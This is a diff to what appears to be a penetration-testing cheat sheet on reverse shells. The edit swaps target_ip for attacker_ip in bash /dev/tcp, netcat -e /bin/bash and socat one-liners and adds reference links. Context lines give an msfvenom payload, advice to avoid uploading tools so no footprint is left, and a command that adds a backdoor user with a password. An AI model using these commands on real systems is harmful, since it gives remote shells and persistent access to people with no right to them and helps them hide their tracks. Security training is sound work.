@@ -129,21 +129,23 @@ register_tick_function ($e, $_REQUEST['pass']);
 If the target is located in the intranet, I cannot connect to it from the outside then Reverse shell is your best choice. Reverse shell means the victim activate the connection to the attacker.  
 1. bash  
 ```php
-bash -i >& /dev/tcp/target_ip/8080 0>&1
+bash -i >& /dev/tcp/attacker_ip/8080 0>&1
 ```  
-`>&` means previous one combines with the following one then redirect to it. Therefore, `0>&1` means `std_input` combines with `std_output` and redirect to `std_output`.  
+Here we need to redirect all the fd 0,1,2 to `/dev/tcp/attacker_ip/port` instead of showing on the victim machine.  
+[ref: Linux反弹shell（一）文件描述符与重定向](https://xz.aliyun.com/t/2548)  
+[ref: Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)  
 
 2. netcat  
 ```php
 nc -lvvp 8080   // listen to the 8080 port
-nc target_ip 8080 -t -e /bin/bash
+nc attacker_ip 8080 -t -e /bin/bash
 ```
 build up a connection then execute `/bin/bash`  
 
 3. socat  
 ```php
 socat tcp-listen:8080 -
-./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:target_ip:8080
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:8080
 ```  
 
 4. python, php, java, perl  
@@ -158,7 +160,7 @@ msfvenom -p cmd/unix/xxxx lhost=target_ip lport=target_port R
 
 Try your best not to upload any tools to the server because it would be complicated to clean your footprint after all. Therefore, we choose the **natural** library to build up the shell much more...  
 
-If you don't like reverse shell anymore, you can...  
+If you want a shell which is more interactive...  
 1. add user  
 ```php
 useradd new;echo 'new:password'|chpasswd
